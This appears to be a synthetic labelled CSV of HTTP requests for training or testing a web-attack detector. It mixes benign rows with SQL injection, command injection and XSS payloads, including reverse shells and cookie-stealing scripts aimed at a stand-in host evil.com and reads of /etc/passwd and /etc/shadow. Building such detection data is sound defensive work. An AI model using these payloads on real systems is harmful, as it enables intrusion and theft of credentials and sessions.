method,url,headers,body,label
DELETE,/admin/settings/security?page=31,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""*/*""}",,benign
GET,/apps/38844/api/v1/items?filter=flat&q=burger&input=1/**/UNION/**/SELECT/**/password/**/FROM/**/users,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/apps/40034""}",,sqli
PUT,/apps/89275,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/login""}","{""quantity"": ""405"", ""name"": ""javascript"", ""description"": ""juice""}",benign
GET,/items/31552?filter=project&brand=hp&page=33&input=%7C%20id%3Buname%20-a,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""application/json"", ""referer"": ""https://example.com/login""}",,cmdi
POST,/login?ref=homepage&offset=390&max=93384,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""value"": ""resume"", ""price"": ""156"", ""username"": ""salad""}",benign
POST,/api/v2/orders/70520/items,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/items/564""}","{""name"": ""watch"", ""title"": ""electronics"", ""category"": ""typescript"", ""description"": ""magazine""}",benign
PUT,/api/apps/87078/deploy?category=pets&q=studio&page=12&offset=248,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/api/apps/55612/deploy""}","{""quantity"": ""201"", ""description"": ""salad"", ""value"": ""project""}",benign
POST,/api/v2/orders/56604/items,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/dashboard/apps/40800/metrics""}","{""username"": ""villa"", ""price"": ""231""}",benign
GET,/register?page=46&filter=rust&q=%3Csvg%20onload%3Dalert%281%29%3E,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""*/*""}",,xss
GET,/search?brand=hp,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""application/json""}",,benign
DELETE,/admin/settings/security?format=csv&offset=2,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""application/json""}",,benign
PUT,/admin/settings/security?lang=de&brand=philips&sort=newest&search=localhost%20%7C%20python%20-c%20%27import%20os%3Bos.system%28%22id%22%29%27,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.126.179.95""}","{""value"": ""smoothie"", ""name"": ""trousers"", ""username"": ""golang"", ""title"": ""trousers"", ""email"": ""monitor""}",cmdi
POST,/admin/settings/security?min=2438&ref=homepage&input=| bash -i >& /dev/tcp/evil.com/4444 0>&1,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""name"": ""biography"", ""value"": ""typescript""}",cmdi
GET,/blog/2025/docker-tea?category=books&brand=asus&q=%7C%20%2Fbin%2Fbash%20-c%20%27id%27,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/blog/2024/electronics-apartment""}",,cmdi
POST,/docs/food-portfolio-shirt-laptop?filter=villa&format=json&ref=social&limit=37,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""description"": ""flat"", ""title"": ""typescript"", ""username"": ""portfolio""}",benign
GET,/apps/80408/api/v1/items?ref=social&lang=ja,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""text/html,application/xhtml+xml"", ""x-forwarded-for"": ""10.136.65.224""}",,benign
DELETE,/items/22672?filter=textbook&page=24&limit=Tom's Diner restaurant,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""*/*""}",,benign
DELETE,/categories/toys/products?limit=cat%20food%20and%20treats,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""*/*"", ""referer"": ""https://example.com/checkout/cart""}",,benign
DELETE,/api/apps/53926/deploy?max=79596&filter=obrien&page=30,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/search""}",,benign
POST,/blog/2022/pizza-project-python,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/docs/cat-trousers-novel""}","{""price"": ""313"", ""name"": ""typescript"", ""username"": ""burger"", ""value"": ""project""}",benign
DELETE,/apps/8100?brand=apple&filter=textbook&id=%3B%20wget%20http%3A%2F%2Fevil.com%2Fshell.sh%20-O%20%2Ftmp%2Fs.sh%20%26%26%20bash%20%2Ftmp%2Fs.sh,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json""}",,cmdi
PUT,/apps/app-81102/dashboard?filter=docker&q=monitor,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.22.147.156""}","{""category"": ""watch"", ""username"": ""docker"", ""title"": ""smoothie""}",benign
POST,"/blog/2022/javascript-whiskas-docker?id='""><script>fetch('http://evil.com?c='+document.cookie)</script>","{""user-agent"": ""'\""><script>fetch('http://evil.com?c='+document.cookie)</script>"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/products/23371/reviews""}","{""username"": ""cat"", ""value"": ""coffee"", ""name"": ""book"", ""quantity"": ""444""}",xss
POST,/categories/clothing/products?q=pet,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""name"": ""kubernetes"", ""value"": ""ansible"", ""username"": ""howto""}",benign
GET,/docs/ubuntu-kubernetes-food?offset=266,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""*/*"", ""referer"": ""https://example.com/apps/7607/api/v1/items""}",,benign
PUT,/checkout/cart?lang=de&ref=social&sort=popularity,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""category"": ""monitor"", ""description"": ""shoes"", ""username"": ""keyboard"", ""value"": ""linux"", ""quantity"": ""389""}",benign
PUT,/checkout/cart?q=resume&input=<iframe src=javascript:alert(1)>,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""name"": ""pizza"", ""price"": ""186"", ""username"": ""shirt""}",xss
POST,/apps/40308/api/v1/items?min=3681&q=salad&sort=relevance&page=31,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""value"": ""laptop"", ""name"": ""cat"", ""title"": ""villa"", ""description"": ""portfolio"", ""category"": ""studio""}",benign
POST,/register?offset=204&limit=17&brand=acer,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""name"": ""novel"", ""description"": ""<object data=javascript:alert(1)>""}",xss
POST,/account/preferences?page=1,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""email"": ""jacket"", ""price"": ""149"", ""title"": ""journal""}",benign
GET,/login?q=Tom's Diner restaurant,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""application/json"", ""referer"": ""https://example.com/categories/books/products""}",,benign
GET,/categories/toys/products?format=json,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*"", ""referer"": ""https://example.com/apps/app-87691/dashboard""}",,benign
PUT,/api/v2/orders/80673/items?max=52464&filter=juice&category=books&page=22,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""description"": ""ansible"", ""email"": ""shirt"", ""price"": ""385""}",benign
POST,"/register?search='""><script>fetch('http://evil.com?c='+document.cookie)</script>","{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/api/apps/46928/deploy""}","{""quantity"": ""202"", ""email"": ""project"", ""description"": ""rust"", ""category"": ""burger""}",xss
DELETE,/register?category=clothing&search=<script>document.location='http://evil.com?'+document.cookie</script>,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml""}",,xss
DELETE,"/products/87255/reviews?q=rust&input=| perl -e 'system(""id"")'","{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/dashboard/apps/60674/metrics"", ""x-forwarded-for"": ""10.58.250.69""}",,cmdi
GET,/account/preferences?category=sports&format=xml&max=27382,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""application/json"", ""referer"": ""https://example.com/admin/settings/security""}",,benign
DELETE,/register?brand=hp&ref=search&max=15590&search=<input autofocus onfocus=alert(1)>,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""application/json"", ""referer"": ""https://example.com/categories/pets/products"", ""x-forwarded-for"": ""10.147.78.41""}",,xss
POST,/apps/96349/api/v1/items?brand=lenovo&category=sports&lang=de,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.64.99.183""}","{""email"": ""novel"", ""price"": ""177"", ""name"": ""docker""}",benign
POST,/login,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""username"": ""resume"", ""email"": ""whiskas""}",benign
POST,/checkout/cart?sort=relevance&offset=219&input=%0acat%20/etc/passwd,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/blog/2025/java-coffee-cafe-flat""}","{""price"": ""163"", ""username"": ""book""}",cmdi
DELETE,/products/7288/reviews?format=json&q=| bash -i >& /dev/tcp/evil.com/4444 0>&1,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""text/html,application/xhtml+xml""}",,cmdi
PUT,/items/91538?min=3083&brand=apple,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""category"": ""keyboard"", ""email"": ""pet"", ""username"": ""pizza"", ""description"": ""monitor""}",benign
POST,/api/v2/orders/96893/items?offset=51,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/register""}","{""quantity"": ""264"", ""username"": ""shoes"", ""category"": ""bag"", ""value"": ""headphones"", ""price"": ""237""}",benign
POST,/account/preferences?min=2067&category=food,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.180.185.133""}","{""quantity"": ""166"", ""value"": ""laptop"", ""category"": ""docker"", ""title"": ""studio""}",benign
POST,/products/44876/reviews,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""value"": ""kubernetes"", ""price"": ""471"", ""quantity"": ""117""}",benign
PUT,/api/apps/9471/deploy?filter=novel&page=9,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/api/apps/15379/deploy""}","{""value"": ""dog"", ""email"": ""ubuntu"", ""category"": ""cafe"", ""username"": ""textbook"", ""price"": ""73""}",benign
GET,/api/apps/82359/deploy?format=csv&brand=acer&sort=relevance&min=1697,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""*/*""}",,benign
DELETE,/login?filter=book,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""*/*""}",,benign
PUT,/apps/72779/api/v1/items?id=1%3B%20SELECT%20%2A%20FROM%20information_schema.tables--,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""quantity"": ""62"", ""value"": ""flat""}",sqli
DELETE,/products/83659/reviews?filter=how to drop table weight effectively,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""*/*"", ""referer"": ""https://example.com/admin/settings/security"", ""x-forwarded-for"": ""10.138.53.249""}",,benign
DELETE,/docs/journal-laptop-resume?min=1528&page=34&max=63891&id=%60whoami%60,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""application/json""}",,cmdi
PUT,/account/preferences?q=0x31272f2a,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""email"": ""trousers"", ""username"": ""resume"", ""description"": ""shoes""}",sqli
POST,/apps/41768/api/v1/items?page=21&sort=rating,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""quantity"": ""203"", ""username"": ""portfolio"", ""value"": ""coffee"", ""category"": ""resume""}",benign
POST,/login,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.190.82.186""}","{""comment"": ""villa"", ""value"": ""1' GROUP BY 1--""}",sqli
POST,/api/v2/orders/58075/items?q=smoothie&page=12,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/apps/37144/api/v1/items""}","{""price"": ""300"", ""name"": ""rust"", ""value"": ""pet""}",benign
POST,/categories/books/products?format=xml,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/api/apps/84033/deploy"", ""x-forwarded-for"": ""10.164.227.118""}","{""email"": ""juice"", ""description"": ""villa""}",benign
GET,/account/preferences?min=4198&offset=74&format=csv,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""application/json""}",,benign
POST,/api/v2/orders/65855/items?input=%60%20cat%20%2Fetc%2Fshadow%20%60,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/api/v2/orders/57745/items""}","{""username"": ""bag"", ""category"": ""bag""}",cmdi
GET,/api/apps/75081/deploy?brand=philips,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
PUT,/api/apps/92534/deploy?brand=cat food and treats&sort=price_desc,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/checkout/cart""}","{""description"": ""watch"", ""value"": ""jacket"", ""name"": ""villa"", ""email"": ""burger"", ""category"": ""rust""}",benign
PUT,/products/85703/reviews?offset=237,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/items/53056""}","{""username"": ""burger"", ""description"": ""keyboard"", ""email"": ""keyboard"", ""price"": ""173"", ""name"": ""python""}",benign
POST,/account/preferences?lang=fr&min=3091&format=csv,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""value"": ""pizza"", ""description"": ""| ls -la"", ""name"": ""house""}",cmdi
POST,/apps/20290?min=910,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""category"": ""journal"", ""price"": ""363"", ""username"": ""studio""}",benign
GET,"/search?max=23550&limit=46&category=pets&q=| perl -e 'system(""id"")'","{""user-agent"": ""axios/1.6.0"", ""accept"": ""application/json""}",,cmdi
